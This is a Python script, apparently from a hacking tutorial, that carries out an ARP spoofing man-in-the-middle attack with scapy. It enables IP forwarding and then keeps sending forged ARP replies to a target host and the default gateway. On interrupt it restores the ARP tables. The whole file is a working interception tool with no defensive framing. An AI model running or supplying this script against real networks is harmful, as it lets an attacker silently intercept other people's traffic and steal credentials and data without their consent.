#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import subprocess
import platform
import re

def get_mac(ip):
    # use scapy.ls(scapy.ARP()) to see the fields, example: print(arp_request.summary()) -> ARP who has Net('192.168.0.0/24') says 192.168.0.50
    arp_request = scapy.ARP(pdst=ip)
    # set broadcast to delivered this packet to all clients on the same network 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def get_default_gateway():
    if platform.system() == "Darwin":
        route_default_result = subprocess.check_output(["route", "get", "default"])
        gateway = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", route_default_result).group(0)

    elif platform.system() == "Linux":
        route_default_result = re.findall(r"([\w.][\w.]*'?\w?)", subprocess.check_output(["ip", "route"]))
        gateway = route_default_result[2]

    if route_default_result:
        return(gateway)
    else:
        print("(x) Could not default gateway.")

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #op 1 = request, 2 = response (is-at); spoof_ip is the ip of the router that a target associate with the MAC of the attacker for example: print(packet.summary()) -> ARP is at 60:f8:1d:b3:f2:7a says 192.168.252.1
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = ""
gateway_ip = get_default_gateway() 

try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Sent " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n I see do you want to quit ... Resetting ARP tables, please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)